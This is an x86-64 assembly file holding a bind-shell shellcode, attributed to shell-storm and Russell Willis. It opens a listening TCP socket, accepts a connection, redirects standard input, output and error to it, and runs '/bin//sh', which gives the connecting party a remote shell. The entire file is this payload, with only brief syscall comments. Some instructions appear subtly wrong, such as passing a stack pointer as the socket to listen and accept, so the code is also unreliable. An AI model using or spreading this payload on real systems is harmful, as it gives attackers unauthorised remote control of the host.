;Shellcode from http://shell-storm.org/shellcode/files/shellcode-858.php
;Author Russell Willis

BITS 64
section .text
global _start

_start:
  xor    rax,rax
  xor    rdi,rdi
  xor    rsi,rsi
  xor    rdx,rdx
  xor    r8,r8
  
;socket(af_inet=2 (internet IP), sock_stream=1 (tcp), protocol=0(unspecified))
  push   0x2
  pop    rdi
  push   0x1
  pop    rsi
  push   0x6
  pop    rdx
  push   0x29
  pop    rax
  syscall 
  mov rdi, rax
  
;struct setup
  xor 	 rax, rax
  push	 rax
  push 	 0x00000000
  push 	 0xc1df
  push	 0x2
  mov    r8,rsp
  
; bind(sock, *sock_struct, sockaddr_len)
  push   0x10
  pop    rdx
  push   0x31
  pop    rax
  syscall 
  
;listen(sockfd, max_connex)
  push   r8
  pop    rdi
  push   0x1
  pop    rsi
  push   0x32
  pop    rax
  syscall 
  
;accept(sock, *peer, sockaddr_len)
  mov    rsi,rsp
  xor    rcx,rcx
  mov    cl,0x10
  push   rcx
  mov    rdx,rsp
  push   r8
  pop    rdi
  push   0x2b
  pop    rax
  syscall 

;dup loop
doop:
  pop    rcx
  xor    r9,r9
  mov    r9,rax
  mov    rdi,r9
  xor    rsi,rsi
  push   0x3
  pop    rsi
  dec    rsi
  push   0x21
  pop    rax
  syscall 
  jne    doop

;execve("/bin//sh",*{"bin//sh","0x00"},'0x00')
  xor    rdi,rdi
  push   rdi
  push   rdi
  pop    rsi
  pop    rdx
  mov		 rdi,0x68732f6e69622f2f
  shr    rdi,0x8
  push   rdi
  push   rsp
  pop    rdi
  push   0x3b
  pop    rax
  syscall 
